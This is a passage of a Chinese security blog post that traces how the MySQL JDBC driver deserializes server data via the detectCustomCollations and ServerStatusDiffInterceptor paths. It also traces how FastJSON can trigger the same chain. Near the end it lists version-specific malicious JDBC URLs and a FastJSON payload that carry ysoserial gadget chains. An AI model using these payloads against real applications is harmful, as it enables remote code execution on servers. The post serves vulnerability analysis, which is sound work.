class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                customMblen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                stmt = <span class="hljs-built_in">this</span>.getMetadataSafeStatement();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//执行&quot;SHOW COLLATION&quot; SQL语句</span><br>                    results = stmt.executeQuery(<span class="hljs-string">&quot;SHOW COLLATION&quot;</span>);<br>                    <span class="hljs-comment">//若服务版本大于5.0.0进入</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br>                        <span class="hljs-comment">//调用com.mysql.jdbc.Util#resultSetToMap()方法</span><br>                        Util.resultSetToMap(sortedCollationMap, results, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">while</span>(results.next()) &#123;<br>                            sortedCollationMap.put(results.getLong(<span class="hljs-number">3</span>), results.getString(<span class="hljs-number">2</span>));<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.Util#resultSetToMap()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs, <span class="hljs-type">int</span> key, <span class="hljs-type">int</span> value)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        <span class="hljs-comment">//调用ResultSetImpl#getObject()方法</span><br>        mappedValues.put(rs.getObject(key), rs.getObject(value));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ResultSetImpl#getObject()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-built_in">this</span>.checkRowPos();<br>    <span class="hljs-built_in">this</span>.checkColumnBounds(columnIndex);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">columnIndexMinusOne</span> <span class="hljs-operator">=</span> columnIndex - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.thisRow.isNull(columnIndexMinusOne)) &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.wasNullFlag = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndexMinusOne];<br>        String stringVal;<br>        <span class="hljs-keyword">switch</span> (field.getSQLType()) &#123;<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">7</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">16</span> &amp;&amp; !field.isSingleBit()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBoolean(columnIndex);<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">if</span> (!field.isUnsigned()) &#123;<br>                    <span class="hljs-keyword">return</span> Integer.valueOf(<span class="hljs-built_in">this</span>.getByte(columnIndex));<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getInt(columnIndex);<br>......<br>            <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">if</span> (field.getMysqlType() == <span class="hljs-number">255</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);<br>           ......<br></code></pre></td></tr></table></figure><p>ResultSetImpl#getObject()方法</p><ul><li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.11及以上的5.x版本（包名没有了cj）: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollations触发：<br>5.1.41及以上: 不可用<br>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.28-5.1.19： jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc<br>5.1.18以下的5.1.x版本： 不可用<br>5.0.x版本不可用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getObjectDeserializingIfNeeded</span><span class="hljs-params">(<span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.fields[columnIndex - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//field.isBinary() &amp;&amp; field.isBlob()进入</span><br>        <span class="hljs-type">byte</span>[] data = <span class="hljs-built_in">this</span>.getBytes(columnIndex);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.connection.getAutoDeserialize()) &#123;<br>            <span class="hljs-keyword">return</span> data;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> data;<br>            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span> &amp;&amp; data.length &gt;= <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-comment">//data[0] != -84 || data[1] != -19 则表明data不为java类序列化后字节码</span><br>                <span class="hljs-keyword">if</span> (data[<span class="hljs-number">0</span>] != -<span class="hljs-number">84</span> || data[<span class="hljs-number">1</span>] != -<span class="hljs-number">19</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getString(columnIndex);<br>                &#125;<br><span class="hljs-comment">//为java序列号字节码则进行反序列化</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytesIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>                    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytesIn);<br>                    obj = objIn.readObject();<br>                    objIn.close();<br>                    bytesIn.close();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var7) &#123;<br>                    <span class="hljs-keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;ResultSet.Class_not_found___91&quot;</span>) + var7.toString() + Messages.getString(<span class="hljs-string">&quot;ResultSet._while_reading_serialized_object_92&quot;</span>), <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>                    obj = data;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>5.1.41版本后，不再使用getObject()获取”SHOW COLLATION”的结果，此链失效</p><p><img src="/image/image-20220916154732110-16633144539751.png" alt="image-20220916154732110"></p><p>ServerStatusDiffInterceptor链：</p><p>ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设置属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，进而调用 getObject () 方法。</p><p>ServerStatusDiffInterceptor#postProcess()方法和populateMapWithSessionStatusValues()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//执行查询语句自动执行此方法</span><br><span class="hljs-keyword">public</span> ResultSetInternalMethods <span class="hljs-title function_">postProcess</span><span class="hljs-params">(String sql, Statement interceptedStatement, ResultSetInternalMethods originalResultSet, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">if</span> (connection.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.populateMapWithSessionStatusValues(connection, <span class="hljs-built_in">this</span>.postExecuteValues);<br>        connection.getLog().logInfo(<span class="hljs-string">&quot;Server status change for statement:\n&quot;</span> + Util.calculateDifferences(<span class="hljs-built_in">this</span>.preExecuteValues, <span class="hljs-built_in">this</span>.postExecuteValues));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">//执行postProcess()进而执行populateMapWithSessionStatusValues()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateMapWithSessionStatusValues</span><span class="hljs-params">(Connection connection, Map&lt;String, String&gt; toPopulate)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        toPopulate.clear();<br>        stmt = connection.createStatement();<br>        rs = stmt.executeQuery(<span class="hljs-string">&quot;SHOW SESSION STATUS&quot;</span>);<br>        Util.resultSetToMap(toPopulate, rs);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>            rs.close();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (stmt != <span class="hljs-literal">null</span>) &#123;<br>            stmt.close();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.Util#resultSetToMap()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行rs.getObject()后执行逻辑与detectCustomCollations链中getObject()执行逻辑相同，进行反序列化</p><p>FastJSON-JDBC调用链</p><p>如上所述当  JSON串为 {“@type”:”java.lang.AutoCloseable”, “@type”: “com.mysql.jdbc.JDBC4Connection”}会调用至com.mysql.jdbc.JDBC4Connection的构造方法</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs qml">public JDBC4Connection(<span class="hljs-built_in">String</span> hostToConnectTo, <span class="hljs-built_in">int</span> portToConnectTo, Properties info, <span class="hljs-built_in">String</span> databaseToConnectTo, <span class="hljs-built_in">String</span> <span class="hljs-built_in">url</span>) throws <span class="hljs-title">SQLException</span> &#123;<br>    <span class="hljs-keyword">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, <span class="hljs-built_in">url</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>进而调用com.mysql.jdbc.ConnectionImpl#ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url)构造方法中this.createNewIO(false);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-built_in">this</span>.dbmd = <span class="hljs-built_in">this</span>.getMetaData(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.initializeSafeStatementInterceptors();<br>    <span class="hljs-built_in">this</span>.createNewIO(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.unSafeStatementInterceptors();<br></code></pre></td></tr></table></figure><p>com.mysql.jdbc.ConnectionImpl#createNewIO(boolean isForReconnect)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNewIO</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getConnectionMutex()) &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">mergedProps</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.exposeAsProperties(<span class="hljs-built_in">this</span>.props);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.getHighAvailability()) &#123;<br>            <span class="hljs-built_in">this</span>.connectOneTryOnly(isForReconnect, mergedProps);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.connectWithRetries(isForReconnect, mergedProps);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#connectOneTryOnly()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectOneTryOnly</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect, Properties mergedProps)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Exception</span> <span class="hljs-variable">connectionNotEstablishedBecause</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.coreConnect(mergedProps);<br>        <span class="hljs-built_in">this</span>.connectionId = <span class="hljs-built_in">this</span>.io.getThreadId();<br>        <span class="hljs-built_in">this</span>.isClosed = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldAutoCommit</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getAutoCommit();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">oldIsolationLevel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isolationLevel;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldReadOnly</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isReadOnly(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">oldCatalog</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getCatalog();<br>        <span class="hljs-built_in">this</span>.io.setStatementInterceptors(<span class="hljs-built_in">this</span>.statementInterceptors);<br>        <span class="hljs-built_in">this</span>.initializePropsFromServer();<br>        <span class="hljs-keyword">if</span> (isForReconnect) &#123;<br>            <span class="hljs-built_in">this</span>.setAutoCommit(oldAutoCommit);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hasIsolationLevels) &#123;<br>                <span class="hljs-built_in">this</span>.setTransactionIsolation(oldIsolationLevel);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.setCatalog(oldCatalog);<br>            <span class="hljs-built_in">this</span>.setReadOnly(oldReadOnly);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">if</span> (!(var8 <span class="hljs-keyword">instanceof</span> SQLException) || ((SQLException)var8).getErrorCode() != <span class="hljs-number">1820</span> || <span class="hljs-built_in">this</span>.getDisconnectOnExpiredPasswords()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.io != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.io.forceClose();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (var8 <span class="hljs-keyword">instanceof</span> SQLException) &#123;<br>                <span class="hljs-keyword">throw</span> (SQLException)var8;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">SQLException</span> <span class="hljs-variable">chainedEx</span> <span class="hljs-operator">=</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;Connection.UnableToConnect&quot;</span>), <span class="hljs-string">&quot;08001&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                chainedEx.initCause(var8);<br>                <span class="hljs-keyword">throw</span> chainedEx;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#initializePropsFromServer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializePropsFromServer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">connectionInterceptorClasses</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getConnectionLifecycleInterceptors();<br>    <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (connectionInterceptorClasses != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = Util.loadExtensions(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.props, connectionInterceptorClasses, <span class="hljs-string">&quot;Connection.badLifecycleInterceptor&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.setSessionVariables();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.setTransformedBitIsBoolean(<span class="hljs-literal">false</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.parserKnowsUnicode = <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getUseServerPreparedStmts() &amp;&amp; <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &amp;&amp; !<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    String characterSetResultsOnServerMysql;<br>    String sqlModeAsString;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.loadServerVariables();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-built_in">this</span>.getServerVariableAsInt(<span class="hljs-string">&quot;auto_increment_increment&quot;</span>, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.buildCollationMapping();<br>        <span class="hljs-type">int</span> i;<br>        ……<br></code></pre></td></tr></table></figure><p>调用至ConnectionImpl#buildCollationMapping()</p><p><img src="/image/453d3967-f666-4285-9ca6-cddbf1138006.png" alt="image-20220920161458418"></p><p>最后调用至ResultSetImpl#getObject()，后进行反序列化造成代码执行。</p><p>payload   5.1.11-5.1.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CommonsCollections5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 利用链</span><br>        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/image/1b038b17-718e-4d17-8c91-0598bb759995.png" alt="image-20220920152603206"></p><p>payload 6.0.2&#x2F;6.0.3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 